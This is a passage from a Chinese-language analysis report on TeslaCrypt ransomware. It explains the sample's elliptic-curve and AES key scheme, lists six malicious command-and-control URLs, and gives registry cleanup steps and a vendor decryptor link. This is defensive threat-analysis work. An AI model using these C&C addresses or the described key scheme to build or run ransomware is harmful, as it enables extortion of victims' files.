src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567996729356.png" alt="1567996729356"></p><h2 id="加密机制分析"><a href="#加密机制分析" class="headerlink" title="加密机制分析"></a>加密机制分析</h2><blockquote><p>该勒索病毒虽然提示加密文件是通过非对称RSA-2048算法进行加密的，但经过分析该勒索病毒样本实际上是通过对称AES算法来进行加密的</p></blockquote><h3 id="加密算法："><a href="#加密算法：" class="headerlink" title="加密算法："></a>加密算法：</h3><p>通过查看字符串，发现<font color=red>secp256K1</font>椭圆曲线加密算法（ECC）</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1568083043964.png" alt="1568083043964"></p><p>Secp256K1加密算法，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1568083196137.png" alt="1568083196137"></p><p><font color=red>RIPEMD160 算法</font>计算比特币钱包地址，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1568083527141.png" alt="1568083527141"></p><p><font color=red>SHA-256</font>摘要算法：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1568084212935.png" alt="1568084212935"></p><p>通过对文件加密函数进行了16轮的异或加密，判断出该勒索病毒是通过<font colo=red>AES</font>算法进行加密的。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1568083602748.png" alt="1568083602748"></p><h3 id="加密详解·："><a href="#加密详解·：" class="headerlink" title="加密详解·："></a>加密详解·：</h3><p>1.首先，该病毒样本会生成一个32字节的随机数作为私钥，这里称为：master_btc_priv。</p><p>2.然后计算生成的master_btc_priv的sha256的哈希值,生产master_btc__hash_priv。</p><p>3.再通过调用secp256k1函数来生成master_btc__hash_priv对应的公钥master_btc_hash_pub。</p><p>4.然后再求master_btc_priv对应的公钥master_btc_pub。</p><p>5.样本接下来利用AES算法加密master_btc_priv生成master_key_priv。</p><p>6.根据master_key_priv计算出对应的公钥master_key_pub,此公钥会写入加密文件中，这个公钥在执行线程3时会通过C&amp;C通道加密发给攻击者。</p><p>7.然后再每次加密时，该样本会随机生成32字节的随机数，然后通过secp256K1算法生成一个session_ecdh_secret。并用这个session_ecdh_secret作为AES模式加密的密钥加密session_priv。生成session_key_priv。</p><p>8.根据已经生成的session_key_priv计算出对应的公钥session_key_pub，并保存到加密文件中。</p><p>加密算法大致流程图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E8%93%9D%E4%BF%A1%E5%9B%BE%E7%89%87_088082d3041080848801.jpg" alt="蓝信图片_088082d3041080848801"></p><p>该样本将各种key都保存在了加密文件的头部，详细信息见下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@master/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1568087161590.png" alt="1568087161590"></p><h1 id="0x02-样本溯源"><a href="#0x02-样本溯源" class="headerlink" title="0x02 样本溯源"></a>0x02 样本溯源</h1><table><thead><tr><th>恶意URL</th></tr></thead><tbody><tr><td>“<a href="http://strategicdisaster.info/wordpress/wp-content/plugins/binstr.php&quot;">http://strategicdisaster.info/wordpress/wp-content/plugins/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://videoaminproduktion.de/plugins/binstr.php&quot;">http://videoaminproduktion.de/plugins/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://clubsaintandre.fr/PostsImages/binstr.php&quot;">http://clubsaintandre.fr/PostsImages/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://affiliateproductes.com/binstr.php&quot;">http://affiliateproductes.com/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://ptgp.pl/tmp/binstr.php&quot;">http://ptgp.pl/tmp/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://minteee.com/PostsImages/binstr.php&quot;">http://minteee.com/PostsImages/binstr.php&quot;</a></td></tr></tbody></table><h1 id="0x03-查杀、防御技术方案"><a href="#0x03-查杀、防御技术方案" class="headerlink" title="0x03 查杀、防御技术方案"></a>0x03 查杀、防御技术方案</h1><h2 id="删除病毒文件"><a href="#删除病毒文件" class="headerlink" title="删除病毒文件"></a>删除病毒文件</h2><ul><li>删除”我的文档”目录下的xxxxx.exe病毒文件</li></ul><h2 id="修复注册表"><a href="#修复注册表" class="headerlink" title="修复注册表"></a>修复注册表</h2><ul><li>删除<font color=red>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</font>自启项列表中，名为+++xxxx的键值。</li><li>删除<font color=red>HKEY_CURRRENT_USER\Software\MSVCC</font> 列表中，名为FIX的键值。</li><li>删除<font color=red>HKEY_CURRRENT_USER\Software&lt;personID&gt;</font>列表中的，data键值。</li></ul><h2 id="恢复加密文件"><a href="#恢复加密文件" class="headerlink" title="恢复加密文件"></a>恢复加密文件</h2><p>通过分析发现，该勒索病毒使用的其实是对称加加密算法AES，而非该勒索所说的非对称RSA-2048加密算法。而如今由于该病毒的作者已经将密钥公布，就可以对加密的文件进行解密。各大厂商都以公布相关的解密工具，可以下载这些工具，恢复被加密的文件。</p><p>卡巴斯基的解密工具下载链接：<a href="https://media.kaspersky.com/utilities/VirusUtilities/EN/RakhniDecryptor.zip">https://media.kaspersky.com/utilities/VirusUtilities/EN/RakhniDecryptor.zip</a></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><blockquote><p>该勒索病毒在勒索时随提示的是利用RSA加密算法，来对文件进行加密的，但经过详细分析后是通过AES来对文件加密的，再没有作者的密钥的情况下，理论上是不可以进行解密的。但目前该病毒样本的作者已经将密钥公布，即可以对该勒索病毒进行解密，各大安全厂商都已经出了相关的解密工具。若被加密，可通过这些厂商的工具进行解密。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 奇兵计划 </tag>
            
            <tag> 样本分析报告 </tag>
            
            <tag> 勒索 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
